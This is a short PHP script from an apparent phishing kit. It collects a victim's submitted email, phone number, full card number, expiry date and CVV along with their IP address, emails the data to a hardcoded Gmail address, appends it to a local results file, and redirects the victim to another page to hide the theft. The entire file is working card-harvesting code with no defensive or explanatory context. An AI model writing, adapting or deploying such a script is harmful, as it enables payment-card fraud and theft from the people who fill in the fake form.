<?php
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$back = "index3.html";
$hostname = gethostbyaddr($ip);
$message .= "~~~~~~ Login ~~~~~~\n";
$message .= "email              : ".$_POST['eml']."\n";
$message .= "tel              : ".$_POST['numero']."\n";
$message .= "card            : ".$_POST['x1']." ";
$message .= "".$_POST['x2']." ";
$message .= "".$_POST['x3']." ";
$message .= "".$_POST['x4']."\n";
$message .= "date dexperation            : ".$_POST['moi']."\n";
$message .= "           : ".$_POST['ANN']."\n";

$message .= "CVV              : ".$_POST['cvv']."\n";
$message .= "~~~~~~~~~ Infos ~~~~~~~~~~~\n";
$message .= "IPs              : $ip\n";
$message .= "~~~~~~~ CVV ~~~~~~~\n";
$send = "dnani4593@gmail.com";
$subject = "CVV PST | $ip ";
$headers .= "MIME-Version: 1.0\n";
mail($send,$subject,$message,$headers);
 
$file = fopen("../rslt/AMINE.txt","a");
fwrite($file,$message); 

header("Location: $back");

?>